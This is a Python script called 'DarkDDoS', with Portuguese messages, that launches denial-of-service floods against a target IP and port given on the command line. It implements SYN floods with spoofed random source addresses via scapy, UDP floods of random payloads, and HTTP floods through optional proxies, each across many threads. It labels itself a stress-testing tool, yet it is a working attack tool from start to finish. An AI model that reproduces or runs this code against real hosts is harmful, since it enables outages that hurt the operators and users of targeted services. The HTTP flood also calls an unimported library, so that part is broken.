import sys
import time
import socket
import threading
import random
from scapy.all import *

class DarkDDoS:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.attack_method = None
        self.proxies = []
    
    def _syn_flood(self):
        while True:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            sport = random.randint(1024, 65535)
            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=sport, dport=self.target_port, flags="S")
            send(packet, verbose=0)
    
    def _udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            data = random._urandom(1490)
            sock.sendto(data, (self.target_ip, self.target_port))
    
    def _http_flood(self):
        while True:
            try:
                requests.get(f"http://{self.target_ip}", proxies={"http": random.choice(self.proxies)} if self.proxies else None)
            except:
                pass
    
    def start(self, target_ip, target_port, method="syn", threads=100, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_method = method
        
        print(f"[+] Iniciando ataque {method.upper()} em {target_ip}:{target_port}")
        threads_list = []
        
        for _ in range(threads):
            if method == "syn":
                t = threading.Thread(target=self._syn_flood)
            elif method == "udp":
                t = threading.Thread(target=self._udp_flood)
            elif method == "http":
                t = threading.Thread(target=self._http_flood)
            threads_list.append(t)
            t.start()
        
        time.sleep(duration)
        print("[!] Ataque concluído. Encerrando...")
        sys.exit(0)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="DarkDDoS - Ferramenta de Stress Testing")
    parser.add_argument("-t", "--target", required=True, help="IP do alvo")
    parser.add_argument("-p", "--port", type=int, required=True, help="Porta do alvo")
    parser.add_argument("-m", "--method", choices=["syn", "udp", "http"], default="syn", help="Método de ataque")
    parser.add_argument("-th", "--threads", type=int, default=100, help="Número de threads")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duração em segundos")
    args = parser.parse_args()
    
    DarkDDoS().start(args.target, args.port, args.method, args.threads, args.duration)
